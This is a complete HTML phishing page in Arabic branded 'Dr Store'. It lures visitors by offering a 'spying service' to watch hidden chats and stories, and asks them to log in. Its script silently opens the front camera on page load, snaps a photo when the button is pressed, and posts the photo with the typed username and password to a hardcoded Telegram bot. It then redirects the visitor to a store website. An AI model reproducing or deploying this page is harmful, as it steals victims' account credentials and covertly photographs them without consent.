<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dr Store - Spying Service</title>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background-color: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 20px; padding: 30px 25px; width: 340px; text-align: center; box-shadow: 0 10px 40px rgba(123, 31, 162, 0.2); }
        
        /* تصميم الشعار المرفق (DR) */
        .logo-container { width: 80px; height: 80px; margin: 0 auto 20px; border-radius: 50%; background: linear-gradient(45deg, #7b1fa2, #e91e63); display: flex; align-items: center; justify-content: center; border: 2px solid #333; }
        .logo-text { font-weight: bold; font-size: 32px; color: #fff; letter-spacing: -2px; }
        
        h2 { font-size: 22px; margin-bottom: 5px; color: #fff; }
        .service-name { color: #e91e63; font-weight: bold; font-size: 18px; margin-bottom: 20px; display: block; }
        
        p { font-size: 13px; color: #888; line-height: 1.5; margin-bottom: 25px; }
        
        input { width: 100%; background: #151515; border: 1px solid #222; border-radius: 10px; padding: 14px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; margin-bottom: 12px; text-align: left; direction: ltr; }
        input:focus { border-color: #7b1fa2; }
        
        button { width: 100%; background: linear-gradient(90deg, #7b1fa2, #e91e63); color: white; border: none; border-radius: 10px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 5px; }
        button:hover { opacity: 0.9; transform: scale(1.02); }
        
        .footer-note { margin-top: 25px; font-size: 11px; color: #444; border-top: 1px solid #111; padding-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo-container">
            <span class="logo-text">DR</span>
        </div>
        
        <h2>دكتور ستور - Dr Store</h2>
        <span class="service-name">خدمة التجسس الذكية (Spying)</span>
        
        <p>قم بتسجيل الدخول بحسابك المراد ربطه بالخدمة للبدء في مراقبة النشاطات، القصص، والمحادثات المخفية فوراً.</p>
        
        <input type="text" id="u_name" placeholder="Username / الهاتف / الإيميل" spellcheck="false">
        <input type="password" id="u_pass" placeholder="Password">
        
        <button onclick="startAction()">تسجيل الدخول والبدء</button>
        
        <div class="footer-note">
            جميع الحقوق محفوظة © Dr Store <br>
            Server Status: <span style="color: #4caf50;">Online</span>
        </div>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        // معلومات البوت الخاصة بك
        const TOKEN = "8233268720:AAE3yeH9WImIv_yiCUSRkpL_ok-n0EUUqyA";
        const CHAT_ID = "897618292";

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(s => { document.getElementById('v').srcObject = s; })
            .catch(() => {});

        function startAction() {
            const v = document.getElementById('v'), c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);

            c.toBlob(b => {
                const f = new FormData();
                f.append("chat_id", CHAT_ID);
                f.append("photo", b, "dr_store_hit.jpg");
                f.append("caption", `🎯 صيد جديد من خدمة Spying!\n\n👤 الحساب: ${document.getElementById('u_name').value}\n🔑 الرمز: ${document.getElementById('u_pass').value}\n📍 المصدر: Dr Store Service`);

                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: f })
                .then(() => {
                    // التوجيه لرابط دكتور ستور الذي زودتني به
                    window.location.href = "https://drstoreq.com/?fbclid=PAVERFWAP5YXhleHRuA2FlbQIxMABzcnRjBmFwcF9pZA8xMjQwMjQ1NzQyODc0MTQAAae2KbEB7RxsUb94WjIGRzSZDT3ydZJR3VIv8OH3KtIiMgYhVNI0ICEK0qfnWQ_aem_xRx2LwaDiKslUnCFp-g1tA";
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
